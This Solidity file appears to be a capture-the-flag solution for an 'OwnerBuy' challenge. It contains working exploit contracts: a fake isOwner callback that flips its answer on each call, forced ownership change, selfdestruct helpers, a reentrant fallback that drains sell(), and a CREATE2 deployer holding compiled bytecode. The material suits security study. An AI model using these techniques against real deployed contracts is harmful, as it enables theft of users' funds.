pragma solidity ^0.5.0;

import "../challenge4/OwnerBuy.sol";

contract buyforfree {
    OwnerBuy ownerbuy;

    constructor(address _OwnerBuy, address _OwnerBuySolution) public payable {
        ownerbuy = OwnerBuy(_OwnerBuy);
        ownerbuy.buy.value(1)();
        ownerbuy.transfer(_OwnerBuySolution, 100);
        selfdestruct(address(uint160(_OwnerBuy)));
    }
}

contract OwnerBuySolution {
    bool isOwnerflag = true;
    OwnerBuy ownerbuy;
    uint256 have_sell;

    constructor(address _OwnerBuy) public payable {
        ownerbuy = OwnerBuy(_OwnerBuy);
    }

    function isOwner(address _isOwner) external returns (bool) {
        isOwnerflag = !isOwnerflag;
        return isOwnerflag;
    }

    function exploit() public {
        ownerbuy.changestatus(address(this));
        ownerbuy.changeOwner();
        ownerbuy.setWhite(address(this));
        ownerbuy.setWhite(address(ownerbuy));
        ownerbuy.transferOwnership(
            address(0x220866B1A2219f40e72f5c628B65D54268cA3A9D)
        );
        ownerbuy.buy.value(1)();

        for (uint256 i; i < 3; i++) {
            (new buyforfree).value(100)(address(ownerbuy), address(this));
        }
        ownerbuy.changestatus(address(this));
        ownerbuy.changeOwner();
        ownerbuy.sell(200);
    }

    function finish() public {
        ownerbuy.finish();
    }

    function() external payable {
        if (have_sell < 1) {
            have_sell += 1;
            ownerbuy.sell(200);
        }
    }
}

contract Creat2 {
    address public ownerBuySolution;

    function deploy(uint256 salt) public payable {
        bytes
            memory bytecode = hex"608060405260016000806101000a81548160ff021916908315150217905550604051610cdc380380610cdc8339818101604052602081101561004057600080fd5b810190808051906020019092919050505080600060016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610c3a806100a26000396000f3fe6080604052600436106100345760003560e01c80632f54bf6e1461010357806363d9b7701461016c578063d56b288914610183575b6001805410156101015760018060008282540192505081905550600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b1580156100c457600080fd5b505af11580156100d8573d6000803e3d6000fd5b505050506040513d60208110156100ee57600080fd5b8101908080519060200190929190505050505b005b34801561010f57600080fd5b506101526004803603602081101561012657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061019a565b604051808215151515815260200191505060405180910390f35b34801561017857600080fd5b506101816101da565b005b34801561018f57600080fd5b50610198610929565b005b60008060009054906101000a900460ff16156000806101000a81548160ff0219169083151502179055506000809054906101000a900460ff169050919050565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561027b57600080fd5b505af115801561028f573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102fd57600080fd5b505af1158015610311573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1580156103b657600080fd5b505af11580156103ca573d6000803e3d6000fd5b505050506040513d60208110156103e057600080fd5b810190808051906020019092919050505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1580156104b557600080fd5b505af11580156104c9573d6000803e3d6000fd5b505050506040513d60208110156104df57600080fd5b810190808051906020019092919050505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156105a657600080fd5b505af11580156105ba573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b15801561062957600080fd5b505af115801561063d573d6000803e3d6000fd5b50505050506040513d602081101561065457600080fd5b81019080805190602001909291905050505060005b6003811015610739576064600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff16306040516106a4906109d1565b808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001925050506040518091039082f080158015610728573d6000803e3d6000fd5b509050508080600101915050610669565b50600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156107db57600080fd5b505af11580156107ef573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561085d57600080fd5b505af1158015610871573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b1580156108eb57600080fd5b505af11580156108ff573d6000803e3d6000fd5b505050506040513d602081101561091557600080fd5b810190808051906020019092919050505050565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561099357600080fd5b505af11580156109a7573d6000803e3d6000fd5b505050506040513d60208110156109bd57600080fd5b810190808051906020019092919050505050565b610227806109df8339019056fe60806040526040516102273803806102278339818101604052604081101561002657600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156100eb57600080fd5b505af11580156100ff573d6000803e3d6000fd5b50505050506040513d602081101561011657600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb8260646040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156101d157600080fd5b505af11580156101e5573d6000803e3d6000fd5b505050506040513d60208110156101fb57600080fd5b8101908080519060200190929190505050508173ffffffffffffffffffffffffffffffffffffffff16fffea265627a7a7231582081f3d324730b4807713159a4baecb58b46cd218cac4960ceea9089500b9766d064736f6c634300051100320000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3";
        //await OwnerBuySolution.deploy(target.address)).deployTransaction
        address addr;
        assembly {
            addr := create2(
                callvalue(),
                add(bytecode, 0x20),
                mload(bytecode),
                salt
            )
        }
        ownerBuySolution = addr;
    }

    function getAddress(uint256 _salt) public view returns (address) {
        bytes
            memory bytecode = hex"608060405260016000806101000a81548160ff021916908315150217905550604051610cdc380380610cdc8339818101604052602081101561004057600080fd5b810190808051906020019092919050505080600060016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610c3a806100a26000396000f3fe6080604052600436106100345760003560e01c80632f54bf6e1461010357806363d9b7701461016c578063d56b288914610183575b6001805410156101015760018060008282540192505081905550600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b1580156100c457600080fd5b505af11580156100d8573d6000803e3d6000fd5b505050506040513d60208110156100ee57600080fd5b8101908080519060200190929190505050505b005b34801561010f57600080fd5b506101526004803603602081101561012657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061019a565b604051808215151515815260200191505060405180910390f35b34801561017857600080fd5b506101816101da565b005b34801561018f57600080fd5b50610198610929565b005b60008060009054906101000a900460ff16156000806101000a81548160ff0219169083151502179055506000809054906101000a900460ff169050919050565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561027b57600080fd5b505af115801561028f573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102fd57600080fd5b505af1158015610311573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1580156103b657600080fd5b505af11580156103ca573d6000803e3d6000fd5b505050506040513d60208110156103e057600080fd5b810190808051906020019092919050505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b1580156104b557600080fd5b505af11580156104c9573d6000803e3d6000fd5b505050506040513d60208110156104df57600080fd5b810190808051906020019092919050505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156105a657600080fd5b505af11580156105ba573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b15801561062957600080fd5b505af115801561063d573d6000803e3d6000fd5b50505050506040513d602081101561065457600080fd5b81019080805190602001909291905050505060005b6003811015610739576064600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff16306040516106a4906109d1565b808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001925050506040518091039082f080158015610728573d6000803e3d6000fd5b509050508080600101915050610669565b50600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156107db57600080fd5b505af11580156107ef573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561085d57600080fd5b505af1158015610871573d6000803e3d6000fd5b50505050600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b1580156108eb57600080fd5b505af11580156108ff573d6000803e3d6000fd5b505050506040513d602081101561091557600080fd5b810190808051906020019092919050505050565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561099357600080fd5b505af11580156109a7573d6000803e3d6000fd5b505050506040513d60208110156109bd57600080fd5b810190808051906020019092919050505050565b610227806109df8339019056fe60806040526040516102273803806102278339818101604052604081101561002657600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156100eb57600080fd5b505af11580156100ff573d6000803e3d6000fd5b50505050506040513d602081101561011657600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb8260646040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156101d157600080fd5b505af11580156101e5573d6000803e3d6000fd5b505050506040513d60208110156101fb57600080fd5b8101908080519060200190929190505050508173ffffffffffffffffffffffffffffffffffffffff16fffea265627a7a7231582081f3d324730b4807713159a4baecb58b46cd218cac4960ceea9089500b9766d064736f6c634300051100320000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3";
        //await OwnerBuySolution.deploy(target.address)).deployTransaction
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                _salt,
                keccak256(bytecode)
            )
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }
}
